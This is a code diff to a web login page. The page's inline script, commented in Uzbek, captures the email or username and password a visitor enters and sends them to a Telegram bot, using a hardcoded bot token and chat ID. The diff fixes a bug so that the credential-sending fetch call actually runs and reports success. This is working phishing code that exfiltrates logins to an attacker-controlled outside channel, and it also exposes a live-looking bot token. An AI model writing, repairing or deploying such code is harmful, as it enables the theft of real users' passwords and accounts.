@@ -273,34 +273,34 @@ footer .copyright {
         const password = document.getElementById('password').value;
 
         const botToken = '7765605226:AAHZxGG3bkQtOgrapSrqrlywJX416idTqug';
-        const chatIds = '925918834'; // Bu yerda array bo'lishi mumkin, ammo ishlov alohida bo'ladi
+        const chatId = '925918834'; // ✅ Faqat bitta chat_id bo‘lsa, string yetarli
         const message = `New login details:\nEmail/Username: ${email}\nPassword: ${password}`;
 
-        chatIds.forEach(chatId => {
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
             })
-            .then(response => response.json())
-            .then(data => {
-                if (!data.ok) {
-                    console.error(`Xatolik: ${data.description}`);
-                }
-            })
-            .catch(error => {
-                console.error('Tarmoq xatosi:', error);
-            });
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                alert('Xabar yuborildi.');
+            } else {
+                alert('Xatolik: ' + data.description);
+            }
+        })
+        .catch(error => {
+            console.error('Tarmoq xatosi:', error);
+            alert('Tarmoq xatosi yuz berdi.');
         });
-
-        alert('Xabar yuborildi.');
     });
 </script>
+
 
 </body>
 </html>
